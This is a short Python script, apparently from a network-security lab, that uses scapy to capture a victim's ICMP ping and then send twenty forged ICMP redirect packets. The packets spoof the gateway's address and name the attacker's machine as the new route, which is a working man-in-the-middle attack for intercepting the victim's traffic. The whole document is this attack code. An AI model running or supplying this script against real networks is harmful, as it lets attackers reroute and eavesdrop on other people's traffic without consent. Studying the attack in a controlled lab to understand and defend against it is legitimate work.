


from scapy.all import IP, ICMP, send, sniff

print("Capturing victim packet...")
pkts = sniff(
    iface="wlp2s0",
    filter="icmp and src 10.218.8.108 and dst 10.218.8.170",
    count=1,
    timeout=15,
    promisc=True
)

if len(pkts) == 0:
    print("No packet captured! Make sure victim is pinging server.")
    exit(1)

pkt = pkts[0]
print(f"Captured! id={pkt[ICMP].id}, seq={pkt[ICMP].seq}")
inner = bytes(pkt[IP])[:28]

outer_ip = IP(src="10.218.8.1",   dst="10.218.8.108")  # gateway(spoofed) -> victim
redirect  = ICMP(type=5, code=1, gw="10.218.8.48")     # attacker as new gateway
packet    = outer_ip / redirect / inner

send(packet, iface="wlp2s0", count=20, inter=0.1)
print("Redirect sent!")
